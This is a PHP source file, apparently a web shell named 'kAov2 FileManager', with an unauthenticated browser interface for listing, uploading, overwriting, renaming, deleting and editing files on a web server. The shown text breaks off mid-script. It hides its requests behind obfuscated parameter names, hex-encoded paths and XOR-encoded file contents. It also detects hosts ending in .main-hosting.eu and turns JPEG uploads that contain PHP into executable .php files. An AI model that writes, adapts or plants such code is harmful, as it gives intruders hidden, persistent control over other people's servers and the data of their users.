<?php
error_reporting(E_ERROR | E_PARSE);

/* ==== kAov2.php - FileManager ==== */
$ROOT = realpath(__DIR__) ?: __DIR__;
$uname = php_uname();
$unameFull = htmlspecialchars($uname, ENT_QUOTES);
$serverIp = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown';
$serverType = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';

/* determine "current" directory for display */
$CURRENT = $ROOT;

/* Path utilities */
function normalize_slashes(string $p): string {
    $norm = str_replace('\\', '/', $p);
    $norm = preg_replace('#/+#', '/', $norm);
    return $norm;
}

function safe_join(string $base, string $rel): string {
    if ($rel === '') return $base;
    $base = normalize_slashes($base);
    $rel = normalize_slashes($rel);
    if (is_absolute($rel)) return $rel;
    $joined = rtrim($base, '/') . '/' . ltrim($rel, '/');
    return normalize_slashes($joined);
}

function is_absolute(string $path): bool {
    if ($path === '') return false;
    if ($path[0] === '/') return true; // Unix
    if (strlen($path) >= 3 && ctype_alpha($path[0]) && $path[1] === ':' && $path[2] === '/') {
        return true; // Windows C:/
    }
    if (str_starts_with($path, '//')) return true; // UNC
    return false;
}

function within_root(string $path, string $root): bool {
    $rp = realpath($path);
    $rr = realpath($root);
    if ($rp === false || $rr === false) return false;
    $rp = normalize_slashes($rp);
    $rr = normalize_slashes($rr);
    return str_starts_with($rp, $rr);
}

/* Simple hex decode (nakxn) */
function uhex(string $h): string {
    return hex2bin($h) ?: '';
}

/* Size formatting */
function format_size(int $s): string {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $u = 0;
    $sf = (float)$s;
    while ($sf >= 1024 && $u < count($units) - 1) {
        $sf /= 1024;
        $u++;
    }
    return round($sf, 2) . ' ' . $units[$u];
}

/* Directory listing */
function list_dir(string $path, string $root): array {
    $items = [];
    $handle = @opendir($path);
    if (!$handle) return $items;
    
    while (($entry = readdir($handle)) !== false) {
        if ($entry === '.' || $entry === '..') continue;
        $real = $path . DIRECTORY_SEPARATOR . $entry;
        $isDir = is_dir($real);
        $name = basename($entry);
        $items[] = [
            "name" => $name,
            "type" => $isDir ? "dir" : "file",
            "size" => $isDir ? null : @filesize($real),
            "mtime" => @filemtime($real) ?: 0,
            "path" => normalize_slashes($real),
        ];
    }
    closedir($handle);
    
    usort($items, function($a, $b){
        if ($a["type"] !== $b["type"]) return $a["type"] === "dir" ? -1 : 1;
        return strcasecmp($a["name"], $b["name"]);
    });
    return $items;
}

/* Original Breadcrumb function from kaov2.php */
function breadcrumb_html(string $currentPath, string $root): string {
    $p = normalize_slashes($currentPath);
    if (preg_match('#^[A-Za-z]:/$#', $p)) {
        return '<a href="javascript:void(0)" onclick="goToPath(\'' . htmlspecialchars($p) . '\')">' . htmlspecialchars($p) . '</a>';
    }
    if (preg_match('#^([A-Za-z]:)(/.*)?$#', $p, $m)) {
        $drive = $m[1];
        $rest = $m[2] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'' . htmlspecialchars("$drive/") . '\')">' . htmlspecialchars("$drive/") . '</a>';
        $acc = "$drive";
        foreach ($parts as $i => $seg) {
            $acc .= "/$seg";
            if ($i === count($parts)-1) $out[] = '<strong>' . htmlspecialchars($seg) . '</strong>';
            else $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'' . htmlspecialchars($acc) . '\')">' . htmlspecialchars($seg) . '</a>';
        }
        return implode(' / ', $out);
    }
    if (preg_match('#^//([^/]+)/([^/]+)(/.*)?$#', $p, $m)) {
        $server = $m[1];
        $share = $m[2];
        $rest = $m[3] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'//'.htmlspecialchars("$server/$share").'\')">//'.htmlspecialchars("$server/$share").'</a>';
        $acc = '//' . $server . '/' . $share;
        foreach ($parts as $i => $seg) {
            $acc .= '/' . $seg;
            if ($i === count($parts)-1) $out[] = '<strong>' . htmlspecialchars($seg) . '</strong>';
            else $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'' . htmlspecialchars($acc) . '\')">' . htmlspecialchars($seg) . '</a>';
        }
        return implode(' / ', $out);
    }
    $parts = explode('/', $p);
    $out = [];
    if (($parts[0] ?? '') === '') $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'/\')">/</a>';
    $acc = '';
    foreach ($parts as $i => $seg) {
        if ($seg === '') continue;
        $acc .= '/' . $seg;
        if ($i === count($parts)-1) $out[] = '<strong>' . htmlspecialchars($seg) . '</strong>';
        else $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'' . htmlspecialchars($acc) . '\')">' . htmlspecialchars($seg) . '</a>';
    }
    if (!$out) $out[] = '<a href="javascript:void(0)" onclick="goToPath(\'/\')">/</a>';
    return implode(' / ', $out);
}

function json_response($data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($data);
    exit;
}

/* decode hex nakxn from POST/GET, clamp to root */
function requested_path(string $root): string {
    $raw = $_POST['nakxn'] ?? ($_GET['nakxn'] ?? '');
    $decoded = $raw !== '' ? uhex((string)$raw) : $root;
    $path = (string)$decoded;
    $resolved = safe_join($root, $path);
    if (!within_root($resolved, $root)) $resolved = $root;
    return $resolved;
}

/* ORIGINAL READ function from kaov2.php - reads files with XOR encoding */
function editor_stream_read_file_xor(string $file): string {
    $fh = @fopen($file, 'rb');
    if (!$fh) return '';
    
    $bufSize = 65536;
    $out = '';
    $index = 0;
    
    while (!feof($fh)) {
        $chunk = fread($fh, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        
        $chunkLen = strlen($chunk);
        for ($i = 0; $i < $chunkLen; $i++, $index++) {
            $key = editor_xor_key($index);
            $chunk[$i] = chr(ord($chunk[$i]) ^ $key);
        }
        $out .= $chunk;
    }
    fclose($fh);
    return $out;
}

/* READ (plain) - fallback for non-XOR files */
function editor_stream_read_file_plain(string $file): string {
    $fh = @fopen($file, 'rb');
    if (!$fh) return '';
    $bufSize = 65536;
    $out = '';
    while (!feof($fh)) {
        $chunk = fread($fh, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        $out .= $chunk;
    }
    fclose($fh);
    return $out;
}

/* ORIGINAL Editor XOR key function from kaov2.php */
function editor_xor_key(int $i): int {
    $val = ($i * 31 + 7) & 0xFFFFFFFF;
    $bin = decbin($val);
    $last8 = substr($bin, -8);
    $bx = bindec($last8 === '' ? '0' : $last8);
    $PI = pi();
    $HALF_PI = $PI / 2;
    $a = asin(sin($i + 3)) / $HALF_PI;
    $c = cos($i * 0.5);
    $t = atan(tan(($i + 1) * 0.25)) / $HALF_PI;
    $mix = ($a + $c + $t) / 3.0;
    $trigByte = (int) floor(($mix + 1.0) * 127.5);
    $k = ($bx ^ ($i & 0xFF)) + $trigByte;
    return $k & 0xFF;
}

/* ORIGINAL SAVE functions from kaov2.php with XOR encoding */
function editor_stream_decode_and_write_b64(string $encoded_b64, string $dest): bool {
    $raw = base64_decode($encoded_b64, true);
    if ($raw === false) return false;
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;
    $index = 0;
    $len = strlen($raw);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($raw, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) {
            fclose($fh);
            return false;
        }
    }
    fclose($fh);
    return true;
}

function editor_stream_decode_and_write_legacy(string $encoded, string $dest): bool {
    $encoded = stripslashes($encoded);
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;
    $index = 0;
    $len = strlen($encoded);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($encoded, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) {
            fclose($fh);
            return false;
        }
    }
    fclose($fh);
    return true;
}

// Alternative to mime_content_type() for compatibility
function get_mime_type($filepath) {
    if (function_exists('mime_content_type')) {
        return mime_content_type($filepath);
    }
    
    if (function_exists('finfo_file')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $filepath);
        finfo_close($finfo);
        return $mime;
    }
    
    // Fallback based on file extension
    $ext = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
    $mimeTypes = [
        'txt' => 'text/plain',
        'html' => 'text/html',
        'htm' => 'text/html',
        'php' => 'application/x-httpd-php',
        'css' => 'text/css',
        'js' => 'application/javascript',
        'json' => 'application/json',
        'xml' => 'application/xml',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'pdf' => 'application/pdf',
        'zip' => 'application/zip',
        'rar' => 'application/x-rar-compressed',
        'exe' => 'application/x-msdownload',
        'msi' => 'application/x-msdownload',
        'cab' => 'application/vnd.ms-cab-compressed',
        'mp3' => 'audio/mpeg',
        'wav' => 'audio/wav',
        'mp4' => 'video/mp4',
        'avi' => 'video/x-msvideo',
        'doc' => 'application/msword',
        'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'xls' => 'application/vnd.ms-excel',
        'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    ];
    
    return isset($mimeTypes[$ext]) ? $mimeTypes[$ext] : 'application/octet-stream';
}

/* ===== AJAX API ===== */
$action = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['shikigf'] ?? ($_GET['shikigf'] ?? null);
}

if ($action !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = requested_path($ROOT);
    if (!within_root($path, $ROOT)) {
        json_response(["ok" => false, "error" => "Path out of drive root."], 400);
    }

    switch ($action) {
        case 'list':
            $items = list_dir($path, $ROOT);
            $payload = array_map(function($i){
                return [
                    "name" => $i["name"],
                    "type" => $i["type"],
                    "size" => $i["type"] === "dir" ? "" : ($i["size"] !== false && $i["size"] !== null ? format_size((int)$i["size"]) : ''),
                    "rawSize" => $i["type"] === "dir" ? 0 : ((int)$i["size"]),
                    "mtime" => $i["mtime"] ? date('Y-m-d H:i:s', (int)$i["mtime"]) : '',
                    "path" => $i["path"]
                ];
            }, $items);
            json_response([
                "ok" => true,
                "path" => normalize_slashes($path),
                "breadcrumb" => breadcrumb_html($path, $ROOT),
                "items" => $payload
            ]);
            break;

        case 'check_domain':
            $serverHostname = php_uname('n');
            $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
            json_response([
                "ok" => true,
                "should_disguise" => $shouldDisguise,
                "hostname" => $serverHostname
            ]);
            break;

        case 'upload_xor':
            // Fixed upload handler with overwrite capability
            if (!isset($_FILES['upload']) && !isset($_POST['file_content'])) {
                json_response(['error' => 'No files uploaded', 'ok' => false]);
                break;
            }

            $result = [
                'added' => [],
                'error' => [],
                'warning' => [],
                'removed' => [], // For tracking overwritten files
                'ok' => true
            ];

            $uploadCount = 0;
            $uploadedNames = [];
            $overwrittenCount = 0;

            // Handle POST content uploads (for create new file)
            if (isset($_POST['file_content']) && isset($_POST['file_name'])) {
                $fileName = $_POST['file_name'];
                $content = $_POST['file_content'];
                $encoding = $_POST['content_encoding'] ?? 'raw';

                if ($encoding === 'base64') {
                    $content = base64_decode($content, true);
                }

                $fileName = preg_replace('/[\/\\\\?*:|"<>]/', '_', $fileName);
                $finalPath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $fileName;

                // Check if file exists for overwrite tracking
                $wasOverwritten = file_exists($finalPath);
                if ($wasOverwritten) {
                    $oldStat = stat($finalPath);
                    $result['removed'][] = [
                        'name' => $fileName,
                        'hash' => 'l1_' . base64_encode(str_replace($path, '', $finalPath)),
                        'phash' => 'l1_' . base64_encode(str_replace($path, '', $path)),
                        'mime' => get_mime_type($finalPath),
                        'size' => $oldStat['size'],
                        'ts' => $oldStat['mtime'],
                        'date' => date('Y-m-d H:i:s', $oldStat['mtime']),
                        'read' => 1,
                        'write' => 1,
                        'locked' => 0,
                        'type' => 'file'
                    ];
                    $overwrittenCount++;
                }

                if (file_put_contents($finalPath, $content) !== false) {
                    $stat = stat($finalPath);
                    $result['added'][] = [
                        'name' => $fileName,
                        'hash' => 'l1_' . base64_encode(str_replace($path, '', $finalPath)),
                        'phash' => 'l1_' . base64_encode(str_replace($path, '', $path)),
                        'mime' => get_mime_type($finalPath),
                        'size' => $stat['size'],
                        'ts' => $stat['mtime'],
                        'date' => date('Y-m-d H:i:s', $stat['mtime']),
                        'read' => 1,
                        'write' => 1,
                        'locked' => 0,
                        'type' => 'file'
                    ];
                    $result['notice'] = $wasOverwritten ? 
                        "File overwritten successfully: $fileName" : 
                        "File created successfully: $fileName";
                } else {
                    $result['error'][] = "Failed to create file: $fileName";
                }

                json_response($result);
                break;
            }

            // Handle regular file uploads
            if (isset($_FILES['upload'])) {
                // Handle both single and multiple file uploads
                if (!is_array($_FILES['upload']['name'])) {
                    // Single file
                    $files = [
                        'name' => [$_FILES['upload']['name']],
                        'tmp_name' => [$_FILES['upload']['tmp_name']],
                        'error' => [$_FILES['upload']['error']],
                        'size' => [$_FILES['upload']['size']],
                        'type' => [$_FILES['upload']['type']]
                    ];
                } else {
                    // Multiple files
                    $files = $_FILES['upload'];
                }

                // Process each file
                for ($i = 0; $i < count($files['name']); $i++) {
                    $fileName = $files['name'][$i];
                    $tmpName = $files['tmp_name'][$i];
                    $error = $files['error'][$i];
                    $fileSize = $files['size'][$i];
                    $fileType = $files['type'][$i];

                    // Check for upload errors
                    if ($error !== UPLOAD_ERR_OK) {
                        $result['error'][] = "Upload error for file $fileName (Error code: $error)";
                        continue;
                    }

                    // Check if temp file exists
                    if (!is_uploaded_file($tmpName)) {
                        $result['error'][] = "Temp file not found for $fileName";
                        continue;
                    }

                    // Validate file name
                    $fileName = preg_replace('/[\/\\\\?*:|"<>]/', '_', $fileName);
                    $finalPath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $fileName;

                    // Check if file exists for overwrite tracking
                    $wasOverwritten = file_exists($finalPath);
                    if ($wasOverwritten) {
                        $oldStat = stat($finalPath);
                        $result['removed'][] = [
                            'name' => $fileName,
                            'hash' => 'l1_' . base64_encode(str_replace($path, '', $finalPath)),
                            'phash' => 'l1_' . base64_encode(str_replace($path, '', $path)),
                            'mime' => get_mime_type($finalPath),
                            'size' => $oldStat['size'],
                            'ts' => $oldStat['mtime'],
                            'date' => date('Y-m-d H:i:s', $oldStat['mtime']),
                            'read' => 1,
                            'write' => 1,
                            'locked' => 0,
                            'type' => 'file'
                        ];
                        $overwrittenCount++;
                    }

                    // Apply disguise logic for .main-hosting.eu servers
                    $serverHostname = php_uname('n');
                    $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);

                    if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName) && $fileType === 'image/jpeg') {
                        // Check if it's actually a PHP file disguised as JPG
                        $handle = fopen($tmpName, 'rb');
                        if ($handle) {
                            $preview = fread($handle, 1024);
                            fclose($handle);

                            if (strpos($preview, '<?php') === 0 || strpos($preview, '<?=') !== false) {
                                $fileName = str_replace('.jpg', '.php', $fileName);
                                $finalPath = str_replace('.jpg', '.php', $finalPath);
                                $result['warning'][] = "Disguised PHP file detected and renamed: $fileName";
                            }
                        }
                    }

                    // Move uploaded file (overwrite if exists)
                    if (move_uploaded_file($tmpName, $finalPath)) {
                        $stat = stat($finalPath);
                        $result['added'][] = [
                            'name' => $fileName,
                            'hash' => 'l1_' . base64_encode(str_replace($path, '', $finalPath)),
                            'phash' => 'l1_' . base64_encode(str_replace($path, '', $path)),
                            'mime' => get_mime_type($finalPath),
                            'size' => $stat['size'],
                            'ts' => $stat['mtime'],
                            'date' => date('Y-m-d H:i:s', $stat['mtime']),
                            'read' => 1,
                            'write' => 1,
                            'locked' => 0,
                            'type' => 'file'
                        ];
                        $uploadCount++;
                        $uploadedNames[] = $fileName;
                    } else {
                        $result['error'][] = "Failed to move uploaded file: $fileName";
                    }
                }

                // Set success message with overwrite info
                if ($uploadCount > 0) {
                    if ($overwrittenCount > 0) {
                        $result['notice'] = "Successfully uploaded $uploadCount file(s), $overwrittenCount overwritten: " . implode(', ', $uploadedNames);
                    } else {
                        $result['notice'] = "Successfully uploaded $uploadCount file(s): " . implode(', ', $uploadedNames);
                    }
                }
            }

            json_response($result);
            break;

        case 'delete':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT)) {
                json_response(["ok" => false, "error" => "Invalid target."], 400);
            }
            $ok = is_dir($target) ? @rmdir($target) : @unlink($target);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Delete failed."]);
            break;

        case 'rename':
            $old = (string)($_POST['old'] ?? '');
            $new = (string)($_POST['new'] ?? '');
            if ($old === '' || $new === '') {
                json_response(["ok" => false, "error" => "Missing names."], 400);
            }
            $from = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $old);
            $to = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . basename($new);
            if ($from === false || !within_root($from, $ROOT) || !within_root($to, $ROOT)) {
                json_response(["ok" => false, "error" => "Invalid path."], 400);
            }
            $ok = @rename($from, $to);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Rename failed."]);
            break;

        case 'read':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            
            // Use original kaov2.php read function - try XOR decoding first, fallback to plain
            $content = '';
            $fileSize = filesize($target);
            
            // For small files, try both methods and choose the one that makes sense
            if ($fileSize < 1024 * 1024) { // Less than 1MB
                $xorContent = editor_stream_read_file_xor($target);
                $plainContent = editor_stream_read_file_plain($target);
                
                // Check if XOR decoded content looks like readable text/code
                $xorPrintable = preg_match('/^[\x09\x0A\x0D\x20-\x7E\x80-\xFF]*$/', $xorContent);
                $plainPrintable = preg_match('/^[\x09\x0A\x0D\x20-\x7E\x80-\xFF]*$/', $plainContent);
                
                // If XOR version is more readable or both are equally readable, use XOR
                if ($xorPrintable && (!$plainPrintable || strlen($xorContent) > 0)) {
                    $content = $xorContent;
                } else {
                    $content = $plainContent;
                }
            } else {
                // For larger files, use plain reading to avoid performance issues
                $content = editor_stream_read_file_plain($target);
            }
            
            json_response(["ok" => true, "content" => $content, "name" => basename($target)]);
            break;

        case 'save':
            $name = (string)($_POST['name'] ?? '');
            $b64 = (string)($_POST['content_b64'] ?? '');
            $legacy = (string)($_POST['content'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            
            $ok = false;
            // Use original kaov2.php save functions with XOR encoding
            if ($b64 !== '') $ok = editor_stream_decode_and_write_b64($b64, $target);
            elseif ($legacy !== '') $ok = editor_stream_decode_and_write_legacy($legacy, $target);
            json_response(["ok" => $ok, "error" => $ok ? null : "Save failed."]);
            break;

        default:
            json_response(["ok" => false, "error" => "Unknown shikigf."], 400);
    }
}

/* initial path for JS (decode hex from GET) */
$initialParam = isset($_GET['nakxn']) ? (string)$_GET['nakxn'] : '';
$initialPath = $initialParam !== '' ? uhex($initialParam) : $CURRENT;
$statePath = htmlspecialchars(normalize_slashes($initialPath), ENT_QUOTES);
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>kAov2 FileManager</title>
<style>
body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
.container { max-width: 1200px; margin: 0 auto; }
.header { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; background: #0d0d0d; }
.header h1 { color: #00ff00; margin: 0 0 10px 0; font-size: 24px; }
.server-info { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; font-size: 14px; }
.server-info div { border-left: 3px solid #00ff00; padding-left: 10px; }
.breadcrumb { border: 1px solid #00ff00; padding: 10px; margin-bottom: 20px; background: #0d0d0d; }
.breadcrumb a { color: #00ff00; text-decoration: none; }
.breadcrumb a:hover { text-decoration: underline; }
.controls { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; background: #0d0d0d; }
.controls button { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
.controls button:hover { background: #00ff00; color: #000; }
.controls input, .controls select { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px; margin-right: 10px; margin-bottom: 10px; }
.file-table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; background: #0d0d0d; }
.file-table th, .file-table td { border: 1px solid #00ff00; padding: 8px; text-align: left; }
.file-table th { background: #000; font-weight: bold; }
.file-table tr:nth-child(even) { background: #111; }
.file-table tr:hover { background: #333; }
.file-table .dir-name { color: #ffff00; font-weight: bold; }
.file-table .file-name { color: #00ff00; }
.file-table .actions button { background: #000; color: #ff6600; border: 1px solid #ff6600; padding: 4px 8px; cursor: pointer; font-size: 11px; margin-right: 5px; }
.file-table .actions button:hover { background: #ff6600; color: #000; }
.message { border: 1px solid #00ff00; padding: 10px; margin-bottom: 20px; background: #0d0d0d; }
.message.error { border-color: #ff0000; color: #ff0000; }
.message.success { border-color: #00ff00; color: #00ff00; }
.message.warning { border-color: #ffff00; color: #ffff00; }
.upload-area { border: 2px dashed #00ff00; padding: 40px; text-align: center; margin-bottom: 20px; background: #0d0d0d; cursor: pointer; }
.upload-area.dragover { border-color: #ffff00; background: #1a1a00; }
.upload-progress { border: 1px solid #00ff00; background: #0d0d0d; padding: 10px; margin-bottom: 20px; display: none; }
.progress-bar { width: 100%; height: 20px; background: #000; border: 1px solid #00ff00; }
.progress-fill { height: 100%; background: #00ff00; transition: width 0.3s; width: 0%; }
.modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); }
.modal-content { background: #1a1a1a; border: 2px solid #00ff00; padding: 20px; margin: 50px auto; max-width: 800px; max-height: 80vh; overflow-y: auto; }
.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.modal-title { color: #00ff00; margin: 0; }
.close-btn { background: #ff0000; color: #fff; border: none; padding: 5px 10px; cursor: pointer; }
.editor-textarea { width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #00ff00; font-family: 'Courier New', monospace; padding: 10px; resize: vertical; }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📁 kAov2 FileManager</h1>
        <div class="server-info">
            <div><strong>System:</strong> <?= htmlspecialchars($unameFull) ?></div>
            <div><strong>IP:</strong> <?= htmlspecialchars($serverIp) ?></div>
            <div><strong>Software:</strong> <?= htmlspecialchars($serverType) ?></div>
        </div>
    </div>

    <div class="breadcrumb" id="breadcrumb">
        Loading path...
    </div>

    <div class="controls">
        <button onclick="refreshDir()">🔄 Refresh</button>
        <button onclick="createNewFile()">📄 New File</button>
        <button onclick="createNewFolder()">📁 New Folder</button>
        <input type="text" id="searchBox" placeholder="Search files..." oninput="filterFiles()">
    </div>

    <div id="messageArea"></div>

    <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
        <p>📁 Click to select files or drag & drop here</p>
        <p style="font-size: 12px; color: #ffff00;">⚠️ Files with existing names will be overwritten</p>
        <input type="file" id="fileInput" multiple style="display: none;">
    </div>

    <div class="upload-progress" id="uploadProgress">
        <div>Uploading...</div>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
    </div>

    <table class="file-table" id="fileTable">
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <tr><td colspan="5">Loading directory...</td></tr>
        </tbody>
    </table>
</div>

<!-- Upload Modal (removed showUploadModal functionality) -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 class="modal-title">Upload Files</h3>
            <button class="close-btn" onclick="closeUploadModal()">×</button>
        </div>
        <div>
            <p style="color: #ffff00; font-size: 14px;">⚠️ Files with existing names will be overwritten without confirmation</p>
            <input type="file" id="modalFileInput" multiple>
            <button onclick="uploadSelectedFiles()">Upload</button>
        </div>
    </div>
</div>

<!-- Editor Modal -->
<div id="editorModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 class="modal-title" id="editorTitle">Edit File</h3>
            <button class="close-btn" onclick="closeEditorModal()">×</button>
        </div>
        <div>
            <textarea class="editor-textarea" id="editorContent"></textarea>
            <br><br>
            <button onclick="saveFile()">💾 Save</button>
            <button onclick="closeEditorModal()">❌ Cancel</button>
        </div>
    </div>
</div>

<script>
let currentPath = '<?= $statePath ?>';
let currentEditingFile = '';

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    setupDragDrop();
    loadDirectory(currentPath);
    
    // Fixed file input handler
    document.getElementById('fileInput').addEventListener('change', function(e) {
        if (e.target.files.length > 0) {
            handleFileSelect(e.target.files);
            e.target.value = ''; // Reset input
        }
    });
});

function setupDragDrop() {
    const uploadArea = document.getElementById('uploadArea');
    
    uploadArea.addEventListener('dragover', function(e) {
        e.preventDefault();
        e.stopPropagation();
        uploadArea.classList.add('dragover');
    });
    
    uploadArea.addEventListener('dragleave', function(e) {
        e.preventDefault();
        e.stopPropagation();
        uploadArea.classList.remove('dragover');
    });
    
    uploadArea.addEventListener('drop', function(e) {
        e.preventDefault();
        e.stopPropagation();
        uploadArea.classList.remove('dragover');
        
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            handleFileSelect(files);
        }
    });
}

function showMessage(message, type = 'success') {
    const messageArea = document.getElementById('messageArea');
    messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
    setTimeout(() => {
        messageArea.innerHTML = '';
    }, 5000);
}

function loadDirectory(path) {
    const formData = new FormData();
    formData.append('shikigf', 'list');
    formData.append('nakxn', stringToHex(path));
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            currentPath = data.path;
            updateBreadcrumb(data.breadcrumb);
            updateFileTable(data.items);
        } else {
            showMessage('Error loading directory: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function updateBreadcrumb(breadcrumbHtml) {
    document.getElementById('breadcrumb').innerHTML = breadcrumbHtml;
}

function updateFileTable(items) {
    const tbody = document.querySelector('#fileTable tbody');
    tbody.innerHTML = '';
    
    if (items.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5">Directory is empty</td></tr>';
        return;
    }
    
    items.forEach(item => {
        const row = document.createElement('tr');
        const nameClass = item.type === 'dir' ? 'dir-name' : 'file-name';
        const nameClick = item.type === 'dir' ? `onclick="goToPath('${item.path}')"` : '';
        const nameStyle = item.type === 'dir' ? 'cursor: pointer;' : '';
        
        row.innerHTML = `
            <td><span class="${nameClass}" ${nameClick} style="${nameStyle}">${escapeHtml(item.name)}</span></td>
            <td>${item.type === 'dir' ? '📁 Directory' : '📄 File'}</td>
            <td>${item.size}</td>
            <td>${item.mtime}</td>
            <td class="actions">
                ${item.type === 'file' ? `<button onclick="editFile('${escapeHtml(item.name)}')">📝 Edit</button>` : ''}
                <button onclick="renameItem('${escapeHtml(item.name)}')">✏️ Rename</button>
                <button onclick="deleteItem('${escapeHtml(item.name)}')">🗑️ Delete</button>
            </td>
        `;
        tbody.appendChild(row);
    });
}

function goToPath(path) {
    loadDirectory(path);
}

function refreshDir() {
    loadDirectory(currentPath);
}

function handleFileSelect(files) {
    if (files.length === 0) return;
    
    const formData = new FormData();
    formData.append('shikigf', 'upload_xor');
    formData.append('nakxn', stringToHex(currentPath));
    
    // Handle single or multiple files correctly
    if (files.length === 1) {
        formData.append('upload', files[0]);
    } else {
        Array.from(files).forEach((file) => {
            formData.append('upload[]', file);
        });
    }
    
    showUploadProgress();
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        const contentType = response.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
            return response.text().then(text => {
                console.error('Non-JSON response:', text);
                throw new Error('Server returned non-JSON response. Check console for details.');
            });
        }
        return response.json();
    })
    .then(data => {
        hideUploadProgress();
        console.log('Upload response:', data);
        
        if (data.added && data.added.length > 0) {
            showMessage(data.notice || `Uploaded ${data.added.length} file(s) successfully`);
            refreshDir();
        }
        
        if (data.error && data.error.length > 0) {
            showMessage('Upload errors: ' + data.error.join(', '), 'error');
        }
        
        if (data.warning && data.warning.length > 0) {
            showMessage('Upload warnings: ' + data.warning.join(', '), 'warning');
        }
        
        if (!data.added || data.added.length === 0) {
            showMessage('No files were uploaded. Check console for details.', 'warning');
        }
    })
    .catch(error => {
        hideUploadProgress();
        console.error('Upload error:', error);
        showMessage('Upload error: ' + error.message, 'error');
    });
}

function showUploadProgress() {
    document.getElementById('uploadProgress').style.display = 'block';
    document.getElementById('progressFill').style.width = '50%';
}

function hideUploadProgress() {
    document.getElementById('uploadProgress').style.display = 'none';
